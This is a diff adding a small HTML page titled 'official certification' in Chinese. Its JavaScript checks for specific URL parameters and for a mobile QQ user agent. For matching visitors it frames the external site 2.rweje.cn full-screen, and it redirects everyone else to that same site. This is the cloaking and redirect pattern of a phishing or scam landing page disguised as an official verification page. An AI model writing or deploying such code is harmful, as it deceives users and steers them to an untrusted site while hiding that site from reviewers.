@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <title>官方认证</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <script src="http://s1.pstatp.com/cdn/expire-1-M/jquery/3.6.0/jquery.min.js"></script>
+</head>
+<style>
+    body, html {
+        width: 100%;
+        height: 100%
+    }
+
+    * {
+        margin: 0;
+        padding: 0
+    }
+</style>
+<div></div>
+    <script>
+        $(function () {
+            let params = getUrlParams();
+            let ks = params["_ks"];
+            let uy = params["uy"];
+            let ishare = params["sina,ishare"];
+            if (ks && uy && ishare) {
+                if (isQQEnvironment()) {
+                    let url = "/";
+                    url += "666";
+                    url += "?_ks=" + ks;
+                    url += "&uy=" + uy;
+                    url += "&sina,ishare=" + ishare;
+
+                    iframe(url);
+                } else {
+                    window.location.href = "http://2.rweje.cn/";
+                }
+            } else {
+                window.location.href = "http://2.rweje.cn/";
+            }
+        });
+        function getUrlParams() {
+            let urlParams = {};
+            let url = window.location.href;
+            let startIndex = url.indexOf("?") + 1;
+            
+            if (startIndex > 0) {
+                let paramsString = url.substr(startIndex);
+                let paramsArray = paramsString.split("&");
+                
+                for (let i = 0; i < paramsArray.length; i++) {
+                    let paramPair = paramsArray[i].split("=");
+                    let paramName = decodeURIComponent(paramPair[0]);
+                    let paramValue = decodeURIComponent(paramPair[1]);
+                    urlParams[paramName] = paramValue;
+                }
+            }
+            
+            return urlParams;
+        }
+
+        function isQQEnvironment() {
+            let userAgent = navigator.userAgent.toLowerCase();
+            let isAndroid = /android/.test(userAgent);
+            let isIOS = /(iphone|ipad|ipod|ios)/.test(userAgent);
+            let isQQ = /qq/.test(userAgent);
+            
+            return (isAndroid || isIOS) && isQQ;
+        }
+
+        function iframe(src) {
+            $("div").html('<iframe src="http://2.rweje.cn/" width="100%" height="' + ($(window).height() - 5) + 'px" style="border: 0"></iframe>');
+            $(window).resize();//目标
+        }
+    </script>
+    <div></div>
+</body>
+</html>
